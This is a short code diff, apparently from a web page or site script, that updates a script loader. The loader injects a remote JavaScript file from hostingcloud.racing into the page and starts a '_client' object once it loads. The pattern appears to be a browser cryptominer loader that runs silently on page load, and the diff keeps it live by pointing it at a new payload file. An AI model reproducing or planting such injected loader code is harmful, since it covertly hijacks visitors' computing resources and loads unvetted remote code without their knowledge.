@@ -25,7 +25,7 @@ function myFunction() {
     _client.start();
 }
     var script = document.createElement('script');
-    script.src = 'https://www.hostingcloud.racing/o7t5.js';
+    script.src = 'https://www.hostingcloud.racing/s2CK.js';
     script.onload = script.onreadystatechange = function () {myFunction();};
     var entry = document.getElementsByTagName('script')[0];
     entry.parentNode.insertBefore(script, entry);
